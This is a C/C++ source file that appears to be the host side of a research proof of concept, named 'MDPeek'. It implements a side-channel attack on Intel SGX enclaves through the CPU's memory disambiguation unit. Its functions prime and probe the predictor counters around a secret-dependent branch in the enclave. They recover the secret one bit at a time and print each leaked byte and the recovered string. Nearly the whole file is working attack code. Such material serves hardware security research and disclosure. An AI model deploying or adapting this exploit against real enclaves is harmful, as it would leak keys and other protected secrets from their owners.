#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <sys/mman.h>

# include <unistd.h>
# include <pwd.h>
# define MAX_PATH FILENAME_MAX

#include "sgx_urts.h"
#include "App.h"
#include "Enclave_u.h"
#ifdef _MSC_VER
#include <intrin.h>
#pragma optimize("gt",on)
#else
#include <x86intrin.h>
#endif

sgx_enclave_id_t global_eid = 0;

typedef struct _sgx_errlist_t {
    sgx_status_t err;
    const char *msg;
    const char *sug;
} sgx_errlist_t;

static sgx_errlist_t sgx_errlist[] = {
    {
        SGX_ERROR_UNEXPECTED,
        "Unexpected error occurred.",
        NULL
    },
    {
        SGX_ERROR_INVALID_PARAMETER,
        "Invalid parameter.",
        NULL
    },
    {
        SGX_ERROR_OUT_OF_MEMORY,
        "Out of memory.",
        NULL
    },
    {
        SGX_ERROR_ENCLAVE_LOST,
        "Power transition occurred.",
        "Please refer to the sample \"PowerTransition\" for details."
    },
    {
        SGX_ERROR_INVALID_ENCLAVE,
        "Invalid enclave image.",
        NULL
    },
    {
        SGX_ERROR_INVALID_ENCLAVE_ID,
        "Invalid enclave identification.",
        NULL
    },
    {
        SGX_ERROR_INVALID_SIGNATURE,
        "Invalid enclave signature.",
        NULL
    },
    {
        SGX_ERROR_OUT_OF_EPC,
        "Out of EPC memory.",
        NULL
    },
    {
        SGX_ERROR_NO_DEVICE,
        "Invalid SGX device.",
        "Please make sure SGX module is enabled in the BIOS, and install SGX driver afterwards."
    },
    {
        SGX_ERROR_MEMORY_MAP_CONFLICT,
        "Memory map conflicted.",
        NULL
    },
    {
        SGX_ERROR_INVALID_METADATA,
        "Invalid enclave metadata.",
        NULL
    },
    {
        SGX_ERROR_DEVICE_BUSY,
        "SGX device was busy.",
        NULL
    },
    {
        SGX_ERROR_INVALID_VERSION,
        "Enclave version was invalid.",
        NULL
    },
    {
        SGX_ERROR_INVALID_ATTRIBUTE,
        "Enclave was not authorized.",
        NULL
    },
    {
        SGX_ERROR_ENCLAVE_FILE_ACCESS,
        "Can't open enclave file.",
        NULL
    },
};

void print_error_message(sgx_status_t ret)
{
    size_t idx = 0;
    size_t ttl = sizeof sgx_errlist/sizeof sgx_errlist[0];

    for (idx = 0; idx < ttl; idx++) {
        if(ret == sgx_errlist[idx].err) {
            if(NULL != sgx_errlist[idx].sug)
                printf("Info: %s\n", sgx_errlist[idx].sug);
            printf("Error: %s\n", sgx_errlist[idx].msg);
            break;
        }
    }
    
    if (idx == ttl)
    	printf("Error code is 0x%X. Please refer to the \"Intel SGX SDK Developer Reference\" for more details.\n", ret);
}

int initialize_enclave(void)
{
    sgx_status_t ret = SGX_ERROR_UNEXPECTED;
    
    /* Call sgx_create_enclave to initialize an enclave instance */
    /* Debug Support: set 2nd parameter to 1 */
    ret = sgx_create_enclave(ENCLAVE_FILENAME, SGX_DEBUG_FLAG, NULL, NULL, &global_eid, NULL);
    if (ret != SGX_SUCCESS) {
        print_error_message(ret);
        return -1;
    }

    return 0;
}

void ocall_print_string(const char *str)
{
    printf("%s", str);
}

/* MDPeek Primitive */
extern "C" size_t stld_probe_1(void* addr_st, void* addr_ld);
extern "C" size_t stld_probe_2(void* addr_st, void* addr_ld);

// Calculate the noise from context switch
int get_max_idx(int* vals, int val_len) 
{
    int max = -1;
    int max_idx = -1;
    for (int i = 0; i < val_len; ++ i) {
        if (vals[i] > max) {
            max = vals[i];
            max_idx = i;
        }
    }
    return max_idx;
}

// Initialize 2 MDU counters corresponding to the store-load pair in the enclave to 15
void init_mdu() 
{
    int A[10];
    size_t (*stld_init_1)(void*, void*);
    size_t (*stld_init_2)(void*, void*);
    stld_init_1 = stld_probe_1;
    stld_init_2 = stld_probe_2;
    for (int i = 0; i < 300; ++ i) {
        stld_init_1(&A[0], &A[8]);
        stld_init_2(&A[0], &A[8]);
    }
    for (int i = 0; i < 3; ++ i) {
        stld_init_1(&A[0], &A[0]);
        stld_init_2(&A[0], &A[0]);
    }
}

// Probe 2 MDU counters corresponding to the store-load pair in the enclave
void probe_mdu(int* res_val) 
{
    int A[10];
    int probe_1, probe_2;
    size_t timestamp_1[30], timestamp_2[30];
    int edge_bound = 100;
    for (int i = 0; i < 30; ++ i) {
        timestamp_1[i] = stld_probe_1(&A[0], &A[8]);
        timestamp_2[i] = stld_probe_2(&A[0], &A[8]);
    }
    for(int i = 1; i < 30; ++ i) {
		if (((int)timestamp_1[i - 1] - (int)timestamp_1[i]) > edge_bound) {
			probe_1 = i;
            break;
		}
    }
    for(int i = 1; i < 30; ++ i) {
		if (((int)timestamp_2[i - 1] - (int)timestamp_2[i]) > edge_bound) {
			probe_2 = i;
            break;
		}
    }
	res_val[0] = probe_1;
    res_val[1] = probe_2;
}

// Application entry
int SGX_CDECL main(int argc, char *argv[]) 
{
    (void)(argc);
    (void)(argv);

    int prob_val[2];
    int val_init_1_cnt[16];
    int val_init_2_cnt[16];
    memset(val_init_1_cnt, 0, sizeof(val_init_1_cnt));
    memset(val_init_2_cnt, 0, sizeof(val_init_2_cnt));
    int val_init_1, val_init_2;

    // Initialize the enclave
    if(initialize_enclave() < 0){
        abort();
    }

    // Get init value of each counter after context switches
    for (int i = 0; i < 128; ++ i) {
        init_mdu();
        int ret = secretDependentBranch(global_eid, -1, 0);
        if (ret != SGX_SUCCESS)
            abort();
        probe_mdu(prob_val);
        if (prob_val[0] >= 0 && prob_val[0] <= 15) {
            val_init_1_cnt[prob_val[0]] += 1;
        }
        if (prob_val[1] >= 0 && prob_val[1] <= 15) {
            val_init_2_cnt[prob_val[1]] += 1;
        }
    }
    val_init_1 = get_max_idx(val_init_1_cnt, 16);
    val_init_2 = get_max_idx(val_init_2_cnt, 16);

    // Perform MDU side channel to leak secrets
    #define SECRET_LEN 11
    int recover_bits[SECRET_LEN * 8];
    char recover_secret[SECRET_LEN + 1];
    for (int i = 0; i < SECRET_LEN; ++ i) {
        for (int j = 0; j < 8; ++ j) {
            init_mdu();
            int ret = secretDependentBranch(global_eid, i, j);
            if (ret != SGX_SUCCESS)
                abort();
            probe_mdu(prob_val);
            if (val_init_1 - prob_val[0] == 1 && val_init_2 == prob_val[1]) {
                recover_bits[i * 8 + j] = 1;
            }
            else if (val_init_2 - prob_val[1] == 1 && val_init_1 == prob_val[0]) {
                recover_bits[i * 8 + j] = 0;
            }
            else {
                recover_bits[i * 8 + j] = -1;
            }
        }
    }

    // dump results
    for(int i = 0; i < SECRET_LEN; ++ i) {
        recover_secret[i] = 0;
        for(int j = 0; j < 8; ++ j) {
            if (recover_bits[i * 8 + j] != -1) {
                recover_secret[i] |= (char)(recover_bits[i * 8 + j] << j);
            }
        }
        printf("Leak byte %d: %c (", i, recover_secret[i]);
        for (int j = 0; j < 8; ++ j) {
            printf("%d ", recover_bits[i * 8 + j]);
        }
        printf(")\n");
    }
    recover_secret[SECRET_LEN] = '\0';

    printf("Recovered Secret: %s\n", recover_secret);

    sgx_destroy_enclave(global_eid);
    return 0;
}